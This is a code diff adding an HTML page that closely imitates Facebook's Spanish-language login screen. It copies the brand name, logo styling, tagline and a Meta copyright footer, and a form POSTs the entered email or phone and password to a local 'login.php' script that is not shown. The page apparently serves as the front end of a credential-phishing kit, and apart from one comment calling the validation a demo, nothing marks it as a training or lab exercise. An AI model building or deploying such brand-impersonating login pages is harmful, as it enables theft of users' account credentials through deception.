@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook - Inicia sesión</title>
+  <style>
+    /* Reset y base */
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      color: #1c1e21;
+    }
+    .container {
+      background: #fff;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 10px;
+      box-shadow:
+        0 2px 5px rgba(0,0,0,0.1),
+        0 10px 20px rgba(0,0,0,0.05);
+      padding: 40px 30px 50px;
+      text-align: center;
+      transition: box-shadow 0.3s ease;
+    }
+    .container:hover {
+      box-shadow:
+        0 4px 12px rgba(0,0,0,0.15),
+        0 20px 30px rgba(0,0,0,0.1);
+    }
+    .logo {
+      font-size: 52px;
+      font-weight: 700;
+      color: #1877f2;
+      margin-bottom: 16px;
+      user-select: none;
+      letter-spacing: -1.5px;
+    }
+    .desc {
+      font-size: 20px;
+      line-height: 1.5;
+      margin-bottom: 28px;
+      font-weight: 500;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      gap: 15px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      height: 48px;
+      font-size: 16px;
+      padding: 0 14px;
+      border: 1.8px solid #dddfe2;
+      border-radius: 8px;
+      transition: border-color 0.3s, box-shadow 0.3s;
+      outline-offset: 2px;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 6px rgba(24, 119, 242, 0.6);
+      outline: none;
+    }
+    .error-message {
+      color: #d93025;
+      font-size: 13px;
+      text-align: left;
+      margin-top: -10px;
+      margin-bottom: 6px;
+      display: none;
+    }
+    button.submit-btn {
+      background-color: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: 700;
+      padding: 14px 0;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(24, 119, 242, 0.4);
+      transition: background-color 0.3s, box-shadow 0.3s;
+      user-select: none;
+    }
+    button.submit-btn:hover {
+      background-color: #165ec9;
+      box-shadow: 0 6px 12px rgba(22, 94, 201, 0.6);
+    }
+    a.forgot-link {
+      font-size: 14px;
+      color: #1877f2;
+      text-decoration: none;
+      user-select: none;
+      margin-top: 8px;
+      display: inline-block;
+      transition: text-decoration 0.3s;
+    }
+    a.forgot-link:hover {
+      text-decoration: underline;
+    }
+    .divider {
+      height: 1px;
+      background-color: #dddfe2;
+      margin: 34px 0 30px;
+    }
+    button.create-account {
+      background-color: #42b72a;
+      color: white;
+      font-size: 17px;
+      font-weight: 700;
+      padding: 16px 0;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      user-select: none;
+      box-shadow: 0 4px 8px rgba(66, 183, 42, 0.5);
+      transition: background-color 0.3s, box-shadow 0.3s;
+      width: 100%;
+    }
+    button.create-account:hover {
+      background-color: #36a420;
+      box-shadow: 0 6px 14px rgba(54, 164, 32, 0.7);
+    }
+    .footer {
+      margin-top: 36px;
+      font-size: 13px;
+      color: #606770;
+      user-select: none;
+      letter-spacing: 0.3px;
+    }
+    @media (max-width: 420px) {
+      .container {
+        max-width: 100%;
+        padding: 30px 20px 40px;
+      }
+      .logo {
+        font-size: 44px;
+      }
+      .desc {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main" aria-label="Formulario de inicio de sesión de Facebook">
+    <div class="logo" aria-label="Logo Facebook">facebook</div>
+    <p class="desc">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+
+    <form action="login.php" method="POST" novalidate onsubmit="return validarFormulario();">
+      <input type="text" id="email" name="email" placeholder="Correo electrónico o número de teléfono" aria-required="true" aria-describedby="emailError" />
+      <div id="emailError" class="error-message">Correo o teléfono incorrecto.</div>
+
+      <input type="password" id="password" name="password" placeholder="Contraseña" aria-required="true" aria-describedby="passwordError" />
+      <div id="passwordError" class="error-message">Contraseña incorrecta.</div>
+
+      <button type="submit" class="submit-btn" aria-label="Iniciar sesión">Iniciar sesión</button>
+      <a href="#" class="forgot-link" tabindex="0">¿Olvidaste tu contraseña?</a>
+    </form>
+
+    <div class="divider"></div>
+
+    <button class="create-account" type="button" onclick="alert('Funcionalidad para crear cuenta no implementada.')">
+      Crear cuenta nueva
+    </button>
+
+    <div class="footer" aria-label="Información de copyright y meta">Meta © 2025</div>
+  </div>
+
+  <script>
+    function validarFormulario() {
+      let valido = true;
+
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+
+      const emailError = document.getElementById('emailError');
+      const passwordError = document.getElementById('passwordError');
+
+      // Limpiar errores previos
+      emailError.style.display = 'none';
+      passwordError.style.display = 'none';
+
+      // Validación simple (solo para demostración)
+      if (!emailInput.value.trim()) {
+        emailError.textContent = 'Correo o teléfono incorrecto.';
+        emailError.style.display = 'block';
+        valido = false;
+      }
+
+      if (!passwordInput.value.trim()) {
+        passwordError.textContent = 'Contraseña incorrecta.';
+        passwordError.style.display = 'block';
+        valido = false;
+      }
+
+      return valido;
+    }
+  </script>
+</body>
+</html>
